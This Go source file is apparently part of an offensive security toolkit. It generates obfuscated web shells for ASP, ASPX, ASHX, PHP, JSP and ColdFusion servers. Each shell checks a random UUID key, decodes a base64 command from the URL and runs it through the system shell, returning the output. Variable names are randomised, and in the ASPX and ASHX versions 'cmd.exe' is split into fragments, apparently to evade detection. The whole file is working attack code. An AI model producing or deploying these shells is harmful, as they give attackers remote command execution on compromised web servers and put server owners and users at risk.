package shell

import (
	"fmt"

	"github.com/hashicorp/go-uuid"
)

// GenerateASP returns the content of an ASP web shell and the authentication key (UUID).
func GenerateASP() (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	authKeyVar := GenerateRandomString()
	b64 := GenerateRandomString()
	b64Decode := GenerateRandomString()
	b64Decoded := GenerateRandomString()
	b64String := GenerateRandomString()
	charCounter := GenerateRandomString()
	cmo := GenerateRandomString()
	command := GenerateRandomString()
	dataLength := GenerateRandomString()
	getCommandOutput := GenerateRandomString()
	groupBegin := GenerateRandomString()
	nGroup := GenerateRandomString()
	numDataBytes := GenerateRandomString()
	objCmdExec := GenerateRandomString()
	objShell := GenerateRandomString()
	pOut := GenerateRandomString()
	sOut := GenerateRandomString()
	thisChar := GenerateRandomString()
	thisData := GenerateRandomString()
	userKey := GenerateRandomString()
	userCommand := GenerateRandomString()

	content = "<%\n"
	content += "Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")\n"
	content += "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")\n"
	content += "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")\n"
	content += "Function " + getCommandOutput + "(" + command + ")\n"
	content += "    Dim " + objShell + ", " + objCmdExec + "\n"
	content += "    Set " + objShell + " = CreateObject(\"WScript.Shell\")\n"
	content += "Set " + objCmdExec + " = " + objShell + ".exec(" + command + ")\n"
	content += "    " + getCommandOutput + " = " + objCmdExec + ".StdOut.ReadAll\n"
	content += "End Function\n"
	content += "Function " + b64Decode + "(ByVal " + b64String + ")\n"
	content += "  Const " + b64 + " = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n"
	content += "  Dim " + dataLength + ", " + sOut + ", " + groupBegin + "\n\n"
	content += "  " + b64String + " = Replace(" + b64String + ", vbCrLf, \"\")\n"
	content += "  " + b64String + " = Replace(" + b64String + ", vbTab, \"\")\n"
	content += "  " + b64String + " = Replace(" + b64String + ", \" \", \"\")\n\n"
	content += "  " + dataLength + " = Len(" + b64String + ")\n"
	content += "  If " + dataLength + " Mod 4 <> 0 Then\n"
	content += "    Err.Raise 1, \"" + b64Decode + "\", \"Unexpected input.\"\n"
	content += "    Exit Function\n"
	content += "  End If\n\n\n"
	content += "  For " + groupBegin + " = 1 To " + dataLength + " Step 4\n"
	content += "    Dim " + numDataBytes + ", " + charCounter + ", " + thisChar + ", " + thisData + ", " + nGroup + ", " + pOut + "\n"
	content += "    " + numDataBytes + " = 3\n"
	content += "    " + nGroup + " = 0\n\n"
	content += "    For " + charCounter + " = 0 To 3\n\n"
	content += "      " + thisChar + " = Mid(" + b64String + ", " + groupBegin + " + " + charCounter + ", 1)\n\n"
	content += "      If " + thisChar + " = \"=\" Then\n"
	content += "        " + numDataBytes + " = " + numDataBytes + " - 1\n"
	content += "        " + thisData + " = 0\n"
	content += "      Else\n"
	content += "        " + thisData + " = InStr(1, " + b64 + ", " + thisChar + ", vbBinaryCompare) - 1\n"
	content += "      End If\n"
	content += "      If " + thisData + " = -1 Then\n"
	content += "        Err.Raise 2, \"" + b64Decode + "\", \"Unexpected input.\"\n"
	content += "        Exit Function\n"
	content += "      End If\n\n"
	content += "      " + nGroup + "= 64 * " + nGroup + " + " + thisData + "\n"
	content += "    Next\n\n"
	content += "    " + nGroup + " = Hex(" + nGroup + ")\n\n"
	content += "    " + nGroup + " = String(6 - Len(" + nGroup + "), \"0\") & " + nGroup + "\n\n"
	content += "    " + pOut + " = Chr(CByte(\"&H\" & Mid(" + nGroup + ", 1, 2))) + _\n"
	content += "      Chr(CByte(\"&H\" & Mid(" + nGroup + ", 3, 2))) + _\n"
	content += "      Chr(CByte(\"&H\" & Mid(" + nGroup + ", 5, 2)))\n\n"
	content += "    " + sOut + " = " + sOut + " & Left(" + pOut + ", " + numDataBytes + ")\n"
	content += "  Next\n\n"
	content += "  " + b64Decode + " = " + sOut + "\n"
	content += "End Function\n"
	content += "%>\n"
	content += "<HTML>\n"
	content += "<BODY>\n"
	content += "<PRE>\n"
	content += "<%\n"
	content += "Dim " + authKeyVar + ", " + userKey + ", " + userCommand + "," + b64Decoded + ", " + cmo + "\n\n"
	content += authKeyVar + " = \"" + key + "\"\n"
	content += userKey + " = request(\"key\")\n"
	content += "If " + userKey + " = " + authKeyVar + " Then\n"
	content += "    " + userCommand + " = request(\"cmd\")\n"
	content += "    " + b64Decoded + " = " + b64Decode + "(" + userCommand + ")\n"
	content += "    " + cmo + " = " + getCommandOutput + "(\"cmd /c\" & " + b64Decoded + ")\n"
	content += "    Response.Write(" + cmo + ")\n"
	content += "Else\n"
	content += "    Response.Write(\"Not found\")\n"
	content += "End If\n"
	content += "%>\n"
	content += "</PRE>\n"
	content += "</BODY>\n"
	content += "</HTML>"

	return content, key, nil
}

// GenerateASPX returns the content of an ASPX web shell and the authentication key (UUID).
func GenerateASPX() (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	authKeyVar := GenerateRandomString()
	c := GenerateRandomString()
	c1 := GenerateRandomString()
	c2 := GenerateRandomString()
	c3 := GenerateRandomString()
	cPost := GenerateRandomString()
	cPre := GenerateRandomString()
	data := GenerateRandomString()
	ds := GenerateRandomString()
	exec := GenerateRandomString()
	password := GenerateRandomString()
	userCmd := GenerateRandomString()

	content = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\"%>\n"
	content += "<%@ Import namespace=\"System.Diagnostics\"%>\n"
	content += "<%@ Import Namespace=\"System.IO\" %>\n\n"
	content += "<!DOCTYPE html>\n\n"
	content += "<html xmlns=\"http://www.w3.org/1999/xhtml\">\n"
	content += "<head runat=\"server\">\n"
	content += "<script runat=\"server\">\n"
	content += "    protected void Page_Load(object sender, EventArgs e){\n"
	content += "        string " + authKeyVar + " = \"" + key + "\";\n"
	content += "        string " + password + " = Request.QueryString[\"key\"];\n"
	content += "        string " + userCmd + " = this.Request.QueryString[\"cmd\"];\n"
	content += "        if(" + password + " != " + authKeyVar + " || " + userCmd + ".Equals(null))\n"
	content += "        {\n"
	content += "            return;\n"
	content += "        }\n"
	content += "        byte[] " + data + " = Convert.FromBase64String(" + userCmd + ");\n"
	content += "        string " + ds + " = Encoding.UTF8.GetString(" + data + ");\n"
	content += "        Response.Write(\"<pre>\");\n"
	content += "        Response.Write(Server.HtmlEncode(this." + exec + "(" + ds + ")));\n"
	content += "        Response.Write(\"</pre>\");\n"
	content += "    }\n"
	content += "    string " + exec + "(string " + c3 + ")\n"
	content += "    {\n"
	content += "        try\n"
	content += "        {\n"
	content += "            const string " + cPost + " = \"xe\";\n"
	content += "            const string " + cPre + " = \"cm\";\n"
	content += "            const string " + c1 + " = \"/\";\n"
	content += "            const string " + c + " = \"d.e\";\n"
	content += "            const string " + c2 + " = \"c\";\n\n"
	content += "            ProcessStartInfo processStartInfo = new ProcessStartInfo();\n"
	content += "            processStartInfo.FileName = " + cPre + "+" + c + "+" + cPost + ";\n"
	content += "            processStartInfo.Arguments = " + c1 + "+" + c2 + "+\" \"+" + c3 + ";\n"
	content += "            processStartInfo.RedirectStandardOutput = true;\n"
	content += "            processStartInfo.UseShellExecute = false;\n"
	content += "            Process process = Process.Start(processStartInfo);\n"
	content += "            using (StreamReader streamReader = process.StandardOutput)\n"
	content += "            {\n"
	content += "                string ret = streamReader.ReadToEnd();\n"
	content += "                return ret;\n"
	content += "            }\n"
	content += "        }\n"
	content += "        catch (Exception)\n"
	content += "        {\n"
	content += "            throw;\n"
	content += "        }\n"
	content += "    }\n"
	content += "</script>\n"
	content += "    <title></title>\n"
	content += "</head>\n"
	content += "<body>\n"
	content += "</body>\n"
	content += "</html>\n"

	return content, key, nil
}

// GenerateASHX returns the content of an ASHX (ASP.NET generic HTTP handler) web shell
// and the authentication key (UUID).
func GenerateASHX() (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	className := GenerateRandomString()
	authKeyVar := GenerateRandomString()
	c := GenerateRandomString()
	c1 := GenerateRandomString()
	c2 := GenerateRandomString()
	c3 := GenerateRandomString()
	cPost := GenerateRandomString()
	cPre := GenerateRandomString()
	data := GenerateRandomString()
	ds := GenerateRandomString()
	exec := GenerateRandomString()
	password := GenerateRandomString()
	userCmd := GenerateRandomString()
	ctx := GenerateRandomString()

	content = "<%@ WebHandler Language=\"C#\" Class=\"" + className + "\" %>\n"
	content += "using System;\n"
	content += "using System.Diagnostics;\n"
	content += "using System.IO;\n"
	content += "using System.Text;\n"
	content += "using System.Web;\n\n"
	content += "public class " + className + " : IHttpHandler {\n"
	content += "    public void ProcessRequest(HttpContext " + ctx + ") {\n"
	content += "        string " + authKeyVar + " = \"" + key + "\";\n"
	content += "        string " + password + " = " + ctx + ".Request.QueryString[\"key\"];\n"
	content += "        string " + userCmd + " = " + ctx + ".Request.QueryString[\"cmd\"];\n"
	content += "        if (" + password + " != " + authKeyVar + " || " + userCmd + " == null) {\n"
	content += "            return;\n"
	content += "        }\n"
	content += "        byte[] " + data + " = Convert.FromBase64String(" + userCmd + ");\n"
	content += "        string " + ds + " = Encoding.UTF8.GetString(" + data + ");\n"
	content += "        " + ctx + ".Response.Write(\"<pre>\");\n"
	content += "        " + ctx + ".Response.Write(" + ctx + ".Server.HtmlEncode(" + exec + "(" + ds + ")));\n"
	content += "        " + ctx + ".Response.Write(\"</pre>\");\n"
	content += "    }\n"
	content += "    string " + exec + "(string " + c3 + ") {\n"
	content += "        try {\n"
	content += "            const string " + cPost + " = \"xe\";\n"
	content += "            const string " + cPre + " = \"cm\";\n"
	content += "            const string " + c1 + " = \"/\";\n"
	content += "            const string " + c + " = \"d.e\";\n"
	content += "            const string " + c2 + " = \"c\";\n\n"
	content += "            ProcessStartInfo processStartInfo = new ProcessStartInfo();\n"
	content += "            processStartInfo.FileName = " + cPre + "+" + c + "+" + cPost + ";\n"
	content += "            processStartInfo.Arguments = " + c1 + "+" + c2 + "+\" \"+" + c3 + ";\n"
	content += "            processStartInfo.RedirectStandardOutput = true;\n"
	content += "            processStartInfo.UseShellExecute = false;\n"
	content += "            Process process = Process.Start(processStartInfo);\n"
	content += "            using (StreamReader streamReader = process.StandardOutput) {\n"
	content += "                return streamReader.ReadToEnd();\n"
	content += "            }\n"
	content += "        }\n"
	content += "        catch (Exception) {\n"
	content += "            throw;\n"
	content += "        }\n"
	content += "    }\n"
	content += "    public bool IsReusable { get { return false; } }\n"
	content += "}\n"

	return content, key, nil
}

// GeneratePHP returns the content of a PHP web shell and the authentication key (UUID).
func GeneratePHP() (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	authKeyVar := GenerateRandomString()
	cmd := GenerateRandomString()
	decodedCmd := GenerateRandomString()
	userKey := GenerateRandomString()

	content = "<!DOCTYPE html>\n"
	content += "<html>\n"
	content += "<body>\n"
	content += "<?php\n\n"
	content += "error_reporting(E_ALL ^ E_WARNING);\n"
	content += "$" + authKeyVar + " = \"" + key + "\";\n"
	content += "$" + cmd + " = $_GET['cmd'];\n"
	content += "$" + userKey + " = $_GET['key'];\n\n"
	content += "echo \"<pre>\";\n"
	content += "    if(isset($" + cmd + ") && isset($" + userKey + ") && $" + userKey + " === $" + authKeyVar + ")\n"
	content += "	{\n"
	content += "    	$" + decodedCmd + " = base64_decode($" + cmd + ");\n"
	content += "        if (DIRECTORY_SEPARATOR == '/')\n"
	content += "		{\n"
	content += "        	$p = popen('exec 2>&1; ' . $" + decodedCmd + ", 'r');\n"
	content += "		}\n"
	content += "		else\n"
	content += "		{\n"
	content += "        	$p = popen('cmd /C \"' . $" + decodedCmd + " . '\" 2>&1', 'r');\n"
	content += "		}\n"
	content += "		while (! feof($p))\n"
	content += "		{\n"
	content += "			echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);\n"
	content += "			@ flush();\n"
	content += "		}\n"
	content += "	}\n"
	content += "echo \"</pre>\";\n"
	content += "?>\n"
	content += "</body>\n"
	content += "</html>\n"

	return content, key, nil
}

// GenerateJSP returns the content of a JSP web shell and the authentication key (UUID).
func GenerateJSP() (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	authKeyVar := GenerateRandomString()
	userKey := GenerateRandomString()
	userCmd := GenerateRandomString()
	decoded := GenerateRandomString()
	osName := GenerateRandomString()
	cmdArray := GenerateRandomString()
	proc := GenerateRandomString()
	reader := GenerateRandomString()
	line := GenerateRandomString()
	sb := GenerateRandomString()

	content = "<%@ page import=\"java.io.*,java.util.Base64\" %>\n"
	content += "<%\n"
	content += "String " + authKeyVar + " = \"" + key + "\";\n"
	content += "String " + userKey + " = request.getParameter(\"key\");\n"
	content += "String " + userCmd + " = request.getParameter(\"cmd\");\n"
	content += "if (" + userKey + " != null && " + userKey + ".equals(" + authKeyVar + ") && " + userCmd + " != null) {\n"
	content += "    String " + decoded + " = new String(Base64.getDecoder().decode(" + userCmd + "));\n"
	content += "    String " + osName + " = System.getProperty(\"os.name\").toLowerCase();\n"
	content += "    String[] " + cmdArray + ";\n"
	content += "    if (" + osName + ".contains(\"win\")) {\n"
	content += "        " + cmdArray + " = new String[]{\"cmd\", \"/c\", " + decoded + "};\n"
	content += "    } else {\n"
	content += "        " + cmdArray + " = new String[]{\"/bin/sh\", \"-c\", " + decoded + "};\n"
	content += "    }\n"
	content += "    Process " + proc + " = Runtime.getRuntime().exec(" + cmdArray + ");\n"
	content += "    BufferedReader " + reader + " = new BufferedReader(new InputStreamReader(" + proc + ".getInputStream()));\n"
	content += "    StringBuilder " + sb + " = new StringBuilder();\n"
	content += "    String " + line + ";\n"
	content += "    while ((" + line + " = " + reader + ".readLine()) != null) {\n"
	content += "        " + sb + ".append(" + line + ").append(\"\\n\");\n"
	content += "    }\n"
	content += "    out.println(\"<pre>\" + " + sb + ".toString() + \"</pre>\");\n"
	content += "} else {\n"
	content += "    out.println(\"Not found\");\n"
	content += "}\n"
	content += "%>\n"

	return content, key, nil
}

// GenerateCFM returns the content of a CFM (ColdFusion) web shell and the authentication key (UUID).
func GenerateCFM() (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	authKeyVar := GenerateRandomString()
	decodedVar := GenerateRandomString()
	cmdVar := GenerateRandomString()
	outputVar := GenerateRandomString()

	content = "<cfparam name=\"URL.key\" default=\"\">\n"
	content += "<cfparam name=\"URL.cmd\" default=\"\">\n"
	content += "<cfset " + authKeyVar + " = \"" + key + "\">\n"
	content += "<cfif URL.key EQ " + authKeyVar + " AND URL.cmd NEQ \"\">\n"
	content += "    <cfset " + decodedVar + " = ToString(BinaryDecode(URL.cmd, \"Base64\"))>\n"
	content += "    <cfif FindNoCase(\"win\", server.os.name)>\n"
	content += "        <cfset " + cmdVar + " = \"cmd\">\n"
	content += "        <cfset " + decodedVar + " = \"/c \" & " + decodedVar + ">\n"
	content += "    <cfelse>\n"
	content += "        <cfset " + cmdVar + " = \"/bin/sh\">\n"
	content += "        <cfset " + decodedVar + " = \"-c \" & " + decodedVar + ">\n"
	content += "    </cfif>\n"
	content += "    <cfexecute name=\"#" + cmdVar + "#\" arguments=\"#" + decodedVar + "#\" variable=\"" + outputVar + "\" timeout=\"30\">\n"
	content += "    </cfexecute>\n"
	content += "    <cfoutput><pre>#" + outputVar + "#</pre></cfoutput>\n"
	content += "<cfelse>\n"
	content += "    Not found\n"
	content += "</cfif>\n"

	return content, key, nil
}
